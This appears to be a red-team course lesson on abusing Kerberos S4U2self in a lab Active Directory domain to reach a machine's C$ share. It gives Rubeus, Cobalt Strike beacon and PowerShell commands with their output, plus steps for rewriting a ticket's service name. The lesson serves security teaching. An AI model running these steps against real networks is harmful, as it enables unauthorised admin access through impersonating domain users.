As we saw in the previous two examples of constrained delegation, there are two S4U (Service for User) extensions.  S4U2self (Service for User to Self) and S4U2proxy (Service for User to Proxy).  S4U2self allows a service to obtain a TGS to itself on behalf of a user, and S4U2proxy allows the service to obtain a TGS on behalf of a user to a second service.

When we abused constrained delegation, we did: Rubeus `s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$`.

From the output, we saw Rubeus first builds an S4U2self request and obtains a TGS for **nlamb** to **srv-2/dev.cyberbotic.io**.  It then build an S4U2proxy request to obtain a TGS for **nlamb** to **cifs/wkstn-2.dev.cyberbotic.io**.

This is obviously working by design because SRV-2 is specifically trusted for delegation to that service.  However, there's another particularly useful way, published by [Elad Shamir](https://twitter.com/elad_shamir), to abuse the S4U2self extension - and that is to gain access to a domain computer if we have its RC4, AES256 or TGT.

There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse (the later two are covered in later modules).

We can demonstrate this with a TGT for WKSTN-2, which we can obtain via the Printer Bug exercise.  If we import the TGT into a sacrificial session and try and access C$, it will fail.

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> make_token DEV\WKSTN-2$ FakePass
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-2-tgt.kirbi

beacon> ls \\wkstn-2.dev.cyberbotic.io\c$
[-] could not open \\wkstn-2.dev.cyberbotic.io\c$\*: 5
```

  
This is because machines do not get remote local admin access to themselves over CIFS.  What we can do instead is abuse S4U2self to obtain a TGS to itself, as a user we know _is_ a local admin (e.g. a domain admin).

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN-2$ /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /impersonateuser:nlamb /ticket:doIFLz[...snip...]MuSU8= /nowrap

[*] Action: S4U
[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2self request to 10.10.17.71:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFdD [...snip...] MtMiQ=

[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2proxy request to domain controller 10.10.17.71:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

  

The S4U2proxy step will fail, which is fine.  Write the S4U2self TGS to a file.

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi", [System.Convert]::FromBase64String("doIFdD [...snip...] MtMiQ="))
```

  

Use `Rubeus describe` to show information about the ticket.

```
C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  WKSTN-2$
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
```

  

The `ServiceName` of WKSTN-2$ is not valid for our use - we want it to be for CIFS.  This can be easily changed, because as we saw in the constrained delegation alternate service name demo, the service name is not in the encrypted part of the ticket and is not "checked".

To modify the ticket, open it with the ASN editor in `C:\Tools\Asn1Editor`.  Find the two instances where the **GENERAL STRING** "WKSTN-2$" appears.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/asneditor_before.png)

  

Double-click them to open the **Node Content Editor** and replace these strings with "cifs".  We also need to add an additional string node with the FQDN of the machine.  Right-click on the parent **SEQUENCE** and select **New**.  Enter **1b** in the **Tag** field and click **OK**.  Double-click on the new node to edit the text.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/asneditor_after.png)

  

Save the ticket and use `Rubeus describe` again.  Notice how the `ServiceName` has now changed.

```
C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

[*] Action: Describe Ticket

  ServiceName              :  cifs/wkstn-2.dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  2/28/2022 7:30:02 PM
  EndTime                  :  3/1/2022 5:19:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
```

  

To use the ticket, simply pass it into your session.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

beacon> ls \\wkstn-2.dev.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:43:43   Program Files
          dir     02/16/2022 12:46:57   Program Files (x86)
          dir     01/20/2022 16:46:38   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 14:45:10   System Volume Information
          dir     05/05/2021 16:13:00   Users
          dir     05/06/2021 09:35:17   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     02/28/2022 09:30:57   pagefile.sys
```

